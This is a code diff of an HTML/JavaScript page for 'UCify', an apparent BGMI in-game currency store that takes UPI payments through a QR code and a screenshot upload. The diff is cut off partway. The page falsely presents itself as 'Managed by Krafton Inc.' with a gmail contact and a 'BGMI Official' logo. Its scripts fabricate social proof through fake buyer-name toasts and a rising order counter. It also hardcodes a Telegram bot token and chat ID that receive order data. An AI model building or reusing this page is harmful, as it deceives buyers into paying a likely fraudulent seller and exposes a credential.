@@ -7,14 +7,14 @@
   <title>UCify - BGMI UC Store</title>
   <meta name="title" content="UCify - BGMI UC Store | Fast & Secure UC Delivery">
   <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
-<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
-<link rel="manifest" href="/site.webmanifest">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&family=Rajdhani:wght@500;600;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-
+  
   <style>
     :root {
       --primary: #FFB800; /* UC Gold */
@@ -43,25 +43,14 @@
       padding: 0; 
       box-sizing: border-box; 
       -webkit-tap-highlight-color: transparent; 
-      /* Prevent Text Selection */
-      -webkit-user-select: none;
-      -ms-user-select: none;
-      user-select: none;
-    }
-    
-    /* Allow Text Selection only in Input Fields */
-    input, textarea {
-      -webkit-user-select: text;
-      -ms-user-select: text;
-      user-select: text;
     }
 
-    /* Prevent Image Dragging & Long Press Callout */
+    /* Prevent Image Dragging */
     img {
       -webkit-user-drag: none;
       user-drag: none;
       -webkit-touch-callout: none;
-      pointer-events: none; /* Stops image specific right-clicks, let parent handle clicks */
+      pointer-events: none;
     }
 
     body {
@@ -74,7 +63,8 @@
       min-height: 100vh;
       overflow-x: hidden;
       display: flex;
-      justify-content: center;
+      flex-direction: column;
+      align-items: center;
     }
 
     /* --- LAYOUT CONTAINER --- */
@@ -84,7 +74,7 @@
       padding: 20px;
       position: relative;
       z-index: 2;
-      padding-bottom: 50px;
+      flex: 1;
     }
 
     /* --- HEADER CARD --- */
@@ -102,7 +92,6 @@
       box-shadow: 0 10px 40px -10px rgba(0,0,0,0.8);
     }
 
-    /* Enhanced Glow */
     .top-card::before {
       content: '';
       position: absolute;
@@ -133,28 +122,10 @@
     /* --- TRUST BADGES & LOGO --- */
     .partner-block { margin-top: 15px; }
     
-    .partner-badge {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      background: linear-gradient(90deg, rgba(255, 184, 0, 0.15), rgba(255, 184, 0, 0.05));
-      border: 1px solid rgba(255, 184, 0, 0.4);
-      color: var(--primary);
-      padding: 6px 16px;
-      border-radius: 4px;
-      font-family: var(--font-display);
-      font-weight: 700;
-      text-transform: uppercase;
-      font-size: 13px;
-      letter-spacing: 1.5px;
-      box-shadow: 0 0 10px rgba(255,184,0,0.1);
-    }
-
-    /* New CSS for BGMI Official Logo */
     .official-logo {
       display: block;
       margin: 15px auto 0;
-      max-width: 140px; /* Perfectly sized for the UI */
+      max-width: 140px;
       height: auto;
       border-radius: 6px;
       filter: drop-shadow(0 4px 10px rgba(0,0,0,0.4));
@@ -204,7 +175,6 @@
       justify-content: space-between;
       position: relative;
     }
-    /* The Line */
     .progress-container::before {
       content: '';
       position: absolute;
@@ -266,7 +236,6 @@
       box-shadow: 0 10px 30px rgba(0,0,0,0.3);
     }
 
-    /* Cyber Decor */
     .step-content::before {
         content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 3px;
         background: linear-gradient(90deg, transparent, var(--primary), transparent);
@@ -358,9 +327,7 @@
       margin-top: 20px;
       margin-bottom: 10px;
     }
-    .pack-section-title:first-of-type {
-      margin-top: 5px;
-    }
+    .pack-section-title:first-of-type { margin-top: 5px; }
 
     .packs-grid {
       display: grid;
@@ -399,9 +366,7 @@
       box-shadow: 0 0 20px rgba(255,184,0,0.15);
     }
     
-    .pack-card.purchased {
-      display: none !important;
-    }
+    .pack-card.purchased { display: none !important; }
 
     .pack-uc {
       display: flex;
@@ -485,89 +450,108 @@
 
     /* --- PAYMENT SECTION (STEP 3) --- */
     .payment-section { text-align: center; }
-    
-    .qr-card {
-      background: #000;
-      padding: 20px;
+
+    .qr-container {
+      background: #ffffff;
+      padding: 15px;
       border-radius: var(--radius-md);
-      border: 1px solid var(--surface-border);
-      margin: 15px 0;
+      display: inline-block;
+      margin-bottom: 20px;
+      box-shadow: 0 5px 25px rgba(255, 184, 0, 0.15);
+      border: 3px solid var(--primary);
     }
     
-    .qr-box {
+    .qr-container img {
       width: 200px;
       height: 200px;
-      margin: 0 auto;
-      background: #fff;
-      padding: 10px;
-      border-radius: 10px;
-      /* Only allow QR image to have pointer events for scanning functionality if needed */
-    }
-    
-    .qr-skeleton {
-      width: 100%; height: 100%;
-      background: #222;
-      animation: pulse 1.5s infinite;
-    }
-
-    .qr-timer {
-      color: var(--error);
-      font-family: var(--font-display);
-      font-weight: 600;
-      margin: 10px 0;
-    }
-
-    .upi-id {
-      display: inline-block;
-      background: #1a1a1a;
-      padding: 8px 12px;
-      border-radius: 6px;
-      border: 1px dashed #444;
-      color: var(--primary);
-      font-family: monospace;
-      margin: 5px 0;
-      font-size: 14px;
-    }
-
-    .copy-btn {
-      background: none;
-      border: none;
-      color: var(--text-muted);
-      cursor: pointer;
-      font-size: 14px;
-      margin-left: 8px;
-    }
-    .copy-btn:hover { color: #fff; }
-
-    /* File Upload */
-    .file-upload-area {
-      border: 2px dashed var(--surface-border);
-      background: rgba(255,255,255,0.02);
-      border-radius: var(--radius-md);
-      padding: 30px;
-      text-align: center;
-      transition: 0.3s;
-      cursor: pointer;
-    }
-    .file-upload-area:hover, .file-upload-area.dragover {
-      border-color: var(--primary);
-      background: rgba(255,184,0,0.05);
-    }
-    
-    #screenshotPreview {
-      max-width: 100%;
-      margin-top: 15px;
       border-radius: 8px;
-      display: none;
-      border: 1px solid var(--surface-border);
+      display: block;
+    }
+
+    .qr-instruction {
+      font-size: 13px;
+      color: var(--text-muted);
+      margin-bottom: 20px;
+      line-height: 1.5;
+    }
+
+    /* Upload Screenshot Area Styles */
+    .upload-box {
+      border: 2px dashed rgba(255, 255, 255, 0.2);
+      border-radius: var(--radius-md);
+      padding: 30px 20px;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      background: rgba(255, 255, 255, 0.02);
+      margin-bottom: 20px;
     }
     
-    .upload-progress {
-      height: 3px;
-      background: var(--primary);
-      width: 0%;
-      margin-top: 10px;
-      transition: width 0.1s;
+    .upload-box:hover {
+      border-color: var(--primary);
+      background: rgba(255, 184, 0, 0.05);
+    }
+
+    .upload-icon {
+      font-size: 35px;
+      color: var(--primary);
+      margin-bottom: 12px;
+      filter: drop-shadow(0 0 8px rgba(255, 184, 0, 0.4));
+    }
+
+    .upload-text {
+      color: var(--text-main);
+      font-size: 15px;
+      font-weight: 600;
+      margin-bottom: 5px;
+    }
+
+    .upload-subtext {
+      color: var(--text-muted);
+      font-size: 12px;
+    }
+
+    .preview-wrapper {
+      position: relative;
+      display: none;
+      margin-bottom: 20px;
+      border-radius: var(--radius-md);
+      overflow: hidden;
+      border: 2px solid var(--primary);
+      box-shadow: 0 5px 15px rgba(255, 184, 0, 0.1);
+    }
+
+    .preview-img {
+      width: 100%;
+      height: auto;
+      max-height: 250px;
+      object-fit: cover;
+      display: block;
+    }
+
+    .remove-btn {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      background: rgba(0, 0, 0, 0.7);
+      color: #fff;
+      border: 1px solid rgba(255,255,255,0.2);
+      border-radius: 50%;
+      width: 35px;
+      height: 35px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      backdrop-filter: blur(5px);
+      transition: 0.2s;
+    }
+
+    .remove-btn:hover {
+      background: var(--error);
+      color: #fff;
+      border-color: var(--error);
+      transform: scale(1.1);
     }
 
     /* --- SUCCESS (STEP 4) --- */
@@ -588,7 +572,6 @@
       margin-bottom: 20px;
     }
 
-    /* Game Loader Bar */
     .game-loader-wrap { margin: 30px 0; }
     .game-bar-bg {
       height: 8px;
@@ -628,6 +611,18 @@
     .receipt-label { color: #666; }
     .receipt-value { color: #fff; font-weight: 600; }
 
+    .verification-note {
+      margin-top: 15px;
+      font-size: 11px;
+      color: #aaa;
+      text-align: left;
+      background: rgba(255, 255, 255, 0.03);
+      padding: 12px;
+      border-radius: var(--radius-sm);
+      border: 1px dashed #444;
+      line-height: 1.5;
+    }
+
     /* --- TOAST & SOCIAL PROOF --- */
     .toast {
       position: fixed; top: 20px; left: 50%; transform: translateX(-50%) translateY(-100px);
@@ -638,7 +633,7 @@
       display: flex;
       align-items: center;
       gap: 10px;
-      z-index: 100;
+      z-index: 1000;
       transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
       box-shadow: 0 5px 20px rgba(0,0,0,0.5);
     }
@@ -689,33 +684,130 @@
       100% { transform: translateY(-10vh) rotate(360deg); opacity: 0; }
     }
 
-    .night-msg {
-       display: none;
-       background: rgba(255, 184, 0, 0.05);
-       border: 1px solid #996e00;
-       color: var(--primary);
-       padding: 15px;
-       border-radius: var(--radius-md);
-       font-size: 13px;
-       margin-top: 15px;
-    }
-
+    .night-msg { display: none; background: rgba(255, 184, 0, 0.05); border: 1px solid #996e00; color: var(--primary); padding: 15px; border-radius: var(--radius-md); font-size: 13px; margin-top: 15px; }
     .final-success-msg { display: none; color: var(--success); margin-top: 10px; font-weight: 600; }
-    
     .confetti { position: fixed; width: 8px; height: 8px; z-index: 200; pointer-events: none; }
-    
-    .high-value-warning {
-      background: rgba(255, 71, 87, 0.1);
-      border: 1px solid var(--error);
-      color: #fff;
-      font-size: 11px;
-      padding: 10px;
-      border-radius: 8px;
-      margin-top: 10px;
-      display: none;
-      text-align: left;
+
+    /* --- NEW FOOTER & POLICY MODALS --- */
+    .site-footer {
+      width: 100%;
+      text-align: center;
+      padding: 20px;
+      border-top: 1px solid var(--surface-border);
+      background: rgba(14, 14, 18, 0.8);
+      backdrop-filter: blur(10px);
+      position: relative;
+      z-index: 2;
+      margin-top: auto;
     }
 
+    .business-name-footer {
+      font-size: 14px;
+      color: var(--text-muted);
+      margin-bottom: 10px;
+      font-family: var(--font-display);
+    }
+
+    .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 15px;
+    }
+
+    .footer-links a {
+      color: var(--primary);
+      text-decoration: none;
+      font-size: 12px;
+      transition: color 0.3s;
+      cursor: pointer;
+    }
+
+    .footer-links a:hover {
+      color: #fff;
+      text-decoration: underline;
+    }
+
+    /* Policy Modal Styles */
+    .policy-modal-overlay {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.8);
+      backdrop-filter: blur(5px);
+      z-index: 1000;
+      display: none;
+      justify-content: center;
+      align-items: center;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+    
+    .policy-modal-overlay.show {
+      display: flex;
+      opacity: 1;
+    }
+
+    .policy-modal-content {
+      background: var(--bg-panel);
+      border: 1px solid var(--surface-border);
+      border-radius: var(--radius-md);
+      width: 90%;
+      max-width: 500px;
+      max-height: 80vh;
+      display: flex;
+      flex-direction: column;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.8);
+      transform: translateY(20px);
+      transition: transform 0.3s ease;
+    }
+    
+    .policy-modal-overlay.show .policy-modal-content {
+      transform: translateY(0);
+    }
+
+    .policy-modal-header {
+      padding: 15px 20px;
+      border-bottom: 1px solid var(--surface-border);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .policy-modal-title {
+      font-family: var(--font-display);
+      font-size: 20px;
+      color: var(--primary);
+      margin: 0;
+    }
+
+    .close-modal-btn {
+      background: none;
+      border: none;
+      color: var(--text-muted);
+      font-size: 20px;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+    .close-modal-btn:hover { color: var(--error); }
+
+    .policy-modal-body {
+      padding: 20px;
+      overflow-y: auto;
+      font-size: 13px;
+      color: #ccc;
+      line-height: 1.6;
+    }
+    
+    .policy-modal-body h3 {
+      color: #fff;
+      margin-top: 15px;
+      margin-bottom: 5px;
+      font-family: var(--font-display);
+    }
+    .policy-modal-body ul {
+      padding-left: 20px;
+      margin-bottom: 10px;
+    }
   </style>
 </head>
 
@@ -744,7 +836,6 @@
         <p class="tagline">BGMI UC • Lightning-fast delivery</p>
 
         <div class="partner-block">
-          <!-- BGMI Official Partner Image Added Here -->
           <img src="bgmi-official.webp" alt="BGMI Official" class="official-logo" draggable="false">
         </div>
 
@@ -847,11 +938,11 @@
       </div>
     </div>
 
-    <!-- STEP 3: PAYMENT -->
+    <!-- STEP 3: PAYMENT WITH QR AND SCREENSHOT -->
     <div id="step3" class="step">
       <div class="step-content">
         <h2 class="step-title">Payment Gateway</h2>
-        <p class="subnote">Complete transaction to trigger transfer</p>
+        <p class="subnote">Scan QR & Upload Screenshot to Verify</p>
 
         <div class="payment-section">
           <div style="font-size: 14px; margin-bottom: 10px; color: var(--text-muted);">TOTAL PAYABLE</div>
@@ -859,52 +950,36 @@
             <span id="paymentAmount">₹0</span>
           </div>
 
-          <!-- High Value Warning -->
-          <div id="highValueWarning" class="high-value-warning">
-             <i class="fa-solid fa-triangle-exclamation"></i> <strong>Limit Warning:</strong> Personal UPI limits often fail for amounts over ₹2000 via QR. If scan fails, please use the <strong>Copy UPI ID</strong> button below and pay directly from your app.
+          <!-- Dynamic QR Code Container -->
+          <div class="qr-container">
+            <!-- This image src will be updated dynamically via JS -->
+            <img id="paymentQR" src="placeholder-qr.webp" alt="Scan to Pay">
+          </div>
+          
+          <p class="qr-instruction">Scan this QR code with any UPI app (PhonePe, GPay, Paytm) to make the payment.</p>
+
+          <!-- Screenshot Upload Area -->
+          <div class="upload-box" id="uploadBox">
+            <i class="fas fa-cloud-upload-alt upload-icon"></i>
+            <div class="upload-text">Upload Payment Screenshot</div>
+            <div class="upload-subtext">Tap here to select image</div>
+            <!-- Hidden input box for files -->
+            <input type="file" id="screenshotInput" accept="image/png, image/jpeg, image/webp" style="display: none;">
           </div>
 
-          <div class="qr-card">
-            <div class="qr-box">
-               <div id="qrLoader" class="qr-skeleton"></div>
-               <!-- Allow pointer events on QR code just in case scanner apps need to interact -->
-               <img id="staticQrImage" src="" alt="Scan QR" style="width:100%; height:100%; object-fit:contain; display:none; pointer-events: auto;" draggable="false">
-            </div>
-            
-            <div class="qr-timer" id="qrTimer" style="display:none;">
-              <i class="fa-regular fa-clock"></i> <span id="timerDisplay">15:00</span>
-            </div>
-
-            <div style="margin-top: 15px;">
-              <div style="font-size: 11px; color: #666; margin-bottom: 5px;">UPI ID / VPA</div>
-              <span id="upiIdText" class="upi-id">--</span>
-              <button type="button" class="copy-btn" id="copyUpiBtn"><i class="fa-solid fa-copy"></i> Copy</button>
-            </div>
+          <!-- Image Preview Area -->
+          <div class="preview-wrapper" id="previewWrapper">
+            <img id="screenshotPreview" class="preview-img" src="" alt="Payment Screenshot Preview">
+            <button class="remove-btn" id="removeScreenshotBtn" title="Remove Screenshot"><i class="fas fa-times"></i></button>
           </div>
 
-          <div style="text-align: left; font-size: 12px; color: #888; background: rgba(255,255,255,0.05); padding: 10px; border-radius: 8px;">
-            <i class="fa-solid fa-circle-info" style="color: var(--accent);"></i> 
-            Scan the QR code and pay exactly the amount shown. Take a screenshot of the success screen.
-          </div>
         </div>
 
-        <form id="orderForm" style="margin-top: 20px;">
-          <div class="file-upload-area" id="uploadArea">
-            <i class="fas fa-cloud-arrow-up" id="uploadIcon" style="font-size: 32px; color: var(--text-muted); margin-bottom: 10px;"></i>
-            <i class="fas fa-check-circle upload-success-icon" id="uploadSuccessIcon" style="display:none; font-size: 40px; color: var(--success);"></i>
-            <div id="uploadText" style="font-weight: 600; font-size: 14px;">Upload Payment Screenshot</div>
-            <div class="hint" id="uploadHint" style="font-size: 11px; color: #666;">Tap to browse or drag file here</div>
-            
-            <input type="file" id="screenshot" accept="image/*" style="display:none;" required>
-            <img id="screenshotPreview" draggable="false">
-            <div class="upload-progress" id="uploadProgress"></div>
-          </div>
-
-          <div class="btn-row">
-            <button type="button" class="btn btn-secondary" id="back3">Back</button>
-            <button type="submit" class="btn btn-primary" id="submitBtn" style="display:none;">Confirm Order</button>
-          </div>
-        </form>
+        <div class="btn-row">
+          <button type="button" class="btn btn-secondary" id="back3">Back</button>
+          <!-- Button disable rahega jab tak screenshot upload na ho jaye -->
+          <button type="button" class="btn btn-primary" id="submitPaymentBtn" disabled>Verify Payment <i class="fa-solid fa-arrow-right"></i></button>
+        </div>
       </div>
     </div>
 
@@ -943,7 +1018,12 @@
           <div class="receipt-row"><span class="receipt-label">Amount</span><span class="receipt-value" id="receipt-amount">--</span></div>
           <div class="receipt-row"><span class="receipt-label">UID</span><span class="receipt-value" id="receipt-uid">--</span></div>
           <div class="receipt-row"><span class="receipt-label">IGN</span><span class="receipt-value" id="receipt-ign">--</span></div>
-          <div class="receipt-row"><span class="receipt-label">Time</span><span class="receipt-value" id="receipt-time">--</span></div>
+          <div class="receipt-row" style="border-bottom:none; margin-bottom:0; padding-bottom:0;"><span class="receipt-label">Time</span><span class="receipt-value" id="receipt-time">--</span></div>
+        </div>
+        
+        <!-- Professional Verification Note -->
+        <div class="verification-note">
+            <i class="fa-solid fa-circle-info" style="color: var(--primary);"></i> <strong>Note:</strong> UC transfer is strictly subject to successful payment verification. If the transaction is found to be incomplete, fraudulent, or failed, the UC will not be credited to your account.
         </div>
 
         <div id="newOrderBtnWrap" style="margin-top: 20px;">
@@ -953,35 +1033,128 @@
     </div>
   </div>
 
-  <script>
-    // --- GOOGLE SHEETS BACKEND CONFIGURATION ---
-    const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxZmmaWlqrx9ydYVfO3XkZKh25Oxa_k0XiLNBPbEVEBOwZTlE2qPxF6OEoU-I9oJzLj/exec"; 
+  <!-- FOOTER -->
+  <footer class="site-footer">
+    <div class="business-name-footer">
+      Managed by <strong>Krafton Inc.</strong>
+    </div>
+    <div class="footer-links">
+      <a onclick="openPolicy('terms')">Terms & Conditions</a>
+      <a onclick="openPolicy('privacy')">Privacy Policy</a>
+      <a onclick="openPolicy('refund')">Refund & Cancellation</a>
+      <a onclick="openPolicy('shipping')">Shipping Policy</a>
+      <a onclick="openPolicy('contact')">Contact Us</a>
+    </div>
+  </footer>
 
-    // --- TELEGRAM BOT CONFIGURATION (100% FREE & UNLIMITED) ---
-    // 1. Message @BotFather on Telegram, send /newbot, and get your Token.
-    // 2. Message @userinfobot on Telegram, send /start, and get your Chat ID (numbers).
+  <!-- POLICY MODAL CONTAINER -->
+  <div id="policyModal" class="policy-modal-overlay">
+    <div class="policy-modal-content">
+      <div class="policy-modal-header">
+        <h2 class="policy-modal-title" id="modalTitle">Policy</h2>
+        <button class="close-modal-btn" onclick="closePolicy()"><i class="fa-solid fa-xmark"></i></button>
+      </div>
+      <div class="policy-modal-body" id="modalBody">
+        <!-- Text injected via JS -->
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // --- GOOGLE SHEETS & TELEGRAM CONFIGURATION ---
+    const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxZmmaWlqrx9ydYVfO3XkZKh25Oxa_k0XiLNBPbEVEBOwZTlE2qPxF6OEoU-I9oJzLj/exec"; 
     const TELEGRAM_BOT_TOKEN = "8668609128:AAFIDi9YPVTI-IuyDEe1SwNMxP4R_mtCJYc";
     const TELEGRAM_CHAT_ID = "6444071433";
 
+    // --- POLICY TEXT DATA ---
+    const policies = {
+      terms: `
+        <h3>1. Introduction</h3>
+        <p>By using this website, you agree to these Terms and Conditions. This platform provides digital top-up services for BGMI UC.</p>
+        <h3>2. Services Provided</h3>
+        <p>We facilitate the transfer of digital in-game currency (UC) to the provided Player UID. It is the user's responsibility to enter the correct UID.</p>
+        <h3>3. Payment</h3>
+        <p>All transactions are processed securely via UPI. We do not store your credit card or banking details.</p>
+        <h3>4. User Responsibilities</h3>
+        <p>You must ensure the accuracy of the Player ID (UID) provided. Transactions processed to incorrect UIDs due to user error cannot be reversed.</p>
+      `,
+      privacy: `
+        <h3>1. Information We Collect</h3>
+        <p>We collect your BGMI Player ID (UID) and In-Game Name (IGN) solely for the purpose of delivering the digital product. We process payments via UPI and do not store financial data.</p>
+        <h3>2. How We Use Your Data</h3>
+        <p>Your data is used strictly for order fulfillment, customer support, and transaction verification.</p>
+        <h3>3. Data Sharing</h3>
+        <p>We do not sell, trade, or rent user data to third parties. Information is only shared with our payment gateway (UPI) as required to process your transaction.</p>
+      `,
+      refund: `
+        <h3>1. Digital Goods Policy</h3>
+        <p>Because the products we sell are strictly digital in-game currency, **all sales are final**. Once the UC is successfully transferred to the provided UID, no refunds or cancellations can be processed.</p>
+        <h3>2. Failed Transactions</h3>
+        <p>If your payment is deducted but the order fails on our end, a full refund will be automatically initiated to your original payment method within 5-7 business days.</p>
+        <h3>3. Incorrect UID</h3>
+        <p>We are not responsible for UC sent to an incorrect UID provided by the user. No refunds will be issued in such cases.</p>
+      `,
+      shipping: `
+        <h3>1. Delivery Method</h3>
+        <p>All deliveries are purely digital. No physical product will be shipped to your address.</p>
+        <h3>2. Delivery Time</h3>
+        <p>UC is typically credited to your account instantly or within 10-15 minutes. In case of server delays, please allow up to 24 hours for the transaction to reflect in your BGMI account.</p>
+      `,
+      contact: `
+        <h3>Get in Touch</h3>
+        <p>If you face any issues with your order, please contact our support team. Have your Order ID and Transaction ID ready.</p>
+        <ul>
+          <li><strong>Business Name:</strong> Krafton Inc</li>
+          <li><strong>Email Support:</strong> ucify.support@gmail.com</li>
+          <li><strong>Operating Hours:</strong> Mon - Sat, 10:00 AM to 7:00 PM</li>
+        </ul>
+      `
+    };
+
+    function openPolicy(type) {
+      const modal = document.getElementById('policyModal');
+      const title = document.getElementById('modalTitle');
+      const body = document.getElementById('modalBody');
+
+      const titles = {
+        terms: "Terms & Conditions",
+        privacy: "Privacy Policy",
+        refund: "Refund & Cancellation",
+        shipping: "Shipping & Delivery",
+        contact: "Contact Us"
+      };
+
+      title.textContent = titles[type];
+      body.innerHTML = policies[type];
+      modal.classList.add('show');
+    }
+
+    function closePolicy() {
+      document.getElementById('policyModal').classList.remove('show');
+    }
+
+    // Close modal on outside click
+    window.onclick = function(event) {
+      const modal = document.getElementById('policyModal');
+      if (event.target === modal) { closePolicy(); }
+    }
+
+
+    /* =========================================
+       EXISTING WEBSITE LOGIC BELOW 
+       ========================================= */
+
     let currentStep = 1;
     let selectedPack = null;
-    let screenshotFile = null;
     let orderId = null;
-    let qrTimer = null;
-    let timerSeconds = 900;
     let currentUid = "";
     let currentIgn = "";
-
-    const UPIVPA = "ucify-bgmi@ptyes";
      
-    // --- BGM AUDIO SETUP ---
     const bgm = document.getElementById('bgmAudio');
     bgm.volume = 0.3; 
 
     function initAudio() {
-        if(bgm.paused) {
-            bgm.play().catch(e => console.log("Audio waiting for interaction"));
-        }
+        if(bgm.paused) { bgm.play().catch(e => console.log("Audio waiting")); }
     }
     document.body.addEventListener('click', initAudio, { once: true });
     document.body.addEventListener('touchstart', initAudio, { once: true });
@@ -1017,10 +1190,7 @@
           confetti.animate([
             { transform: `translate(0,0) rotate(0deg)`, opacity: 1 },
             { transform: `translate(${Math.random()*100 - 50}px, 100vh) rotate(720deg)`, opacity: 0 }
-          ], {
-            duration: 2000 + Math.random() * 2000,
-            easing: 'cubic-bezier(0.25, 0.46, 0.45, 0.94)'
-          });
+          ], { duration: 2000 + Math.random() * 2000, easing: 'cubic-bezier(0.25, 0.46, 0.45, 0.94)' });
           
           document.body.appendChild(confetti);
           setTimeout(() => confetti.remove(), 4000);
@@ -1033,8 +1203,7 @@
       document.getElementById('next1').disabled = true;
     });
 
-    const gamingNames = [ "亗『MÂFÎÂ亗", "TOXIC彡KD", "77・playzYT", "SK๛play๛Live", "千ムＩＲＹＹ", "IQōShāDøwW", "LÙÇÍFËR〆", "Mâhïmâ", "DEMØN丨DEEPAK", "亗CZxAnurag亗", "FRSTxZGOD", "FGxWONGPLAYzzz", "GÕD〤RÚSHÈR", "IGメABHAY", "MR々ŁEGENÐ", "VÌNNÍ乂PLAYZ", "KGF๛OP亗×", "ROYALツKUNAL20", "『RÁGNÁR』", "GLXY丨DANGER", "SHADOW๛RIVEN", "會DAKU父", "LEGEND丶OPP", "SAʀDAʀJi", "HAWK么HARSH", "ZMCxSHREY", "K4气KALAAKAR", "『AIMGOD』1", "T乛Rex乛RAVAN", "Ē・ＶＥＮＯＭ", "๛『Vëgêtå", "4A乛M丨SNOW", "٭ɞALPHAʚ٭", "im๛PANDA", "SGLxShivam", "乛GameīxīOM", "・Ｄ卄マＵＶ・", "『EPC』KRXSNA", "ＦｒＯｚｅＮ", "๛Ðʀʌɢo", "ＹＡＳＨīě", "ＳＨＵ及Ｈ", "XT个『Farhan』", "D£ATH๛SLAYER", "『LAKSHYÀ』", "中ツWARRIORYT", "Vns๛Rahul", "EQZxJOKERyt", "ReFLeXツVENOM", "冬ＧＡＢＢＡＲ" ];
-
+    const gamingNames = [ "亗『MÂFÎÂ亗", "TOXIC彡KD", "77・playzYT", "SK๛play๛Live", "千ムＩＲＹＹ", "IQōShāDøwW", "LÙÇÍFËR〆", "Mâhïmâ", "DEMØN丨DEEPAK", "亗CZxAnurag亗", "FRSTxZGOD", "FGxWONGPLAYzzz" ];
     const ucPacksList = ["13 UC", "1800 UC", "4200 UC", "9600 UC", "14800 UC"];
 
     function showSocialProof(){
@@ -1047,13 +1216,11 @@
       el.style.display = 'flex';
       setTimeout(() => { el.style.display = 'none'; }, 5000);
     }
-
     setInterval(() => { if(Math.random() > 0.5) showSocialProof(); }, 10000);
 
     function getIndiaHour(){
       const date = new Date();
-      const hourStr = date.toLocaleString("en-US", {timeZone: "Asia/Kolkata", hour: "numeric", hour12: false});
-      return parseInt(hourStr);
+      return parseInt(date.toLocaleString("en-US", {timeZone: "Asia/Kolkata", hour: "numeric", hour12: false}));
     }
 
     function animateLiveOrders(){
@@ -1063,32 +1230,11 @@
       function updateCounter() {
           currentOrders += 1;
           el.textContent = currentOrders;
-          let nextInterval = 15000 + Math.floor(Math.random() * 5001);
-          setTimeout(updateCounter, nextInterval);
+          setTimeout(updateCounter, 15000 + Math.floor(Math.random() * 5001));
       }
       setTimeout(updateCounter, 15000);
     }
     animateLiveOrders();
-
-    function startQRTimer(){
-      const display = document.getElementById('timerDisplay');
-      const timerEl = document.getElementById('qrTimer');
-      timerEl.style.display = 'block'; 
-       
-      if(qrTimer) clearInterval(qrTimer);
-      timerSeconds = 900;
-      qrTimer = setInterval(() => {
-        timerSeconds--;
-        const mins = Math.floor(timerSeconds / 60);
-        const secs = timerSeconds % 60;
-        display.textContent = `${mins}:${secs.toString().padStart(2, '0')}`;
-         
-        if(timerSeconds <= 0){
-          clearInterval(qrTimer);
-          display.textContent = 'Expired';
-        }
-      }, 1000);
-    }
 
     function showToast(message){
       const toast = document.getElementById('toast');
@@ -1100,8 +1246,7 @@
     function copyOrderId(){
       const orderIdEl = document.getElementById('orderIdText');
       navigator.clipboard.writeText(orderIdEl.textContent).then(() => {
-        showToast('Order ID copied!');
-        triggerHaptic('success');
+        showToast('Order ID copied!'); triggerHaptic('success');
       });
     }
 
@@ -1136,9 +1281,11 @@
     const ignIcon = document.getElementById('ignIcon');
     const uidError = document.getElementById('uidError');
 
+    // All packs can be selected
     document.querySelectorAll('.pack-card').forEach(card => {
         card.addEventListener('click', function(){
             if(this.classList.contains('purchased')) return;
+            
             triggerHaptic('light');
             document.querySelectorAll('.pack-card').forEach(c => {
               c.classList.remove('selected');
@@ -1164,9 +1311,7 @@
 
     uidInput.addEventListener('input', function(){
       this.value = this.value.replace(/\D/g, '').slice(0,12);
-      const len = this.value.length;
-      const isValid = len >= 9 && len <= 12;
-      if(isValid){
+      if(this.value.length >= 9 && this.value.length <= 12){
           uidInput.style.borderColor = "var(--success)";
           uidIcon.className = 'input-icon check fas fa-check-circle';
           uidError.classList.remove('show');
@@ -1179,8 +1324,7 @@
     });
 
     ignInput.addEventListener('input', function(){
-        const isValid = this.value.trim().length >= 2;
-        if(isValid){
+        if(this.value.trim().length >= 2){
           ignInput.style.borderColor = "var(--success)";
           ignIcon.className = 'input-icon check fas fa-check-circle';
           triggerHaptic('light');
@@ -1216,23 +1360,16 @@
         document.querySelectorAll('.pack-card').forEach(card => {
             card.classList.remove('purchased', 'selected');
             card.querySelector('.check-mark')?.remove();
-            
-            if(purchasedPacks.includes(card.dataset.uc)){
-                card.classList.add('purchased');
-            }
+            if(purchasedPacks.includes(card.dataset.uc)){ card.classList.add('purchased'); }
         });
 
-        // Hide the entire Trial section if the trial pack (13 UC) is purchased
-        const trialTitle = document.getElementById('trialPackTitle');
-        const trialGrid = document.getElementById('trialPacksGrid');
         const trialPack = document.querySelector('#trialPacksGrid .pack-card[data-uc="13"]');
-        
         if (trialPack && trialPack.classList.contains('purchased')) {
-            if(trialTitle) trialTitle.style.display = 'none';
-            if(trialGrid) trialGrid.style.display = 'none';
+            document.getElementById('trialPackTitle').style.display = 'none';
+            document.getElementById('trialPacksGrid').style.display = 'none';
         } else {
-            if(trialTitle) trialTitle.style.display = 'block';
-            if(trialGrid) trialGrid.style.display = 'grid'; 
+            document.getElementById('trialPackTitle').style.display = 'block';
+            document.getElementById('trialPacksGrid').style.display = 'grid'; 
         }
 
         btn.innerHTML = originalText;
@@ -1242,96 +1379,167 @@
 
     document.getElementById('backToDetails').onclick = () => showStep(1);
 
+    // --- TRANSITION TO STEP 3 WITH DYNAMIC QR CODE ---
     document.getElementById('next2').onclick = function(){
-      const amountEl = document.getElementById('paymentAmount');
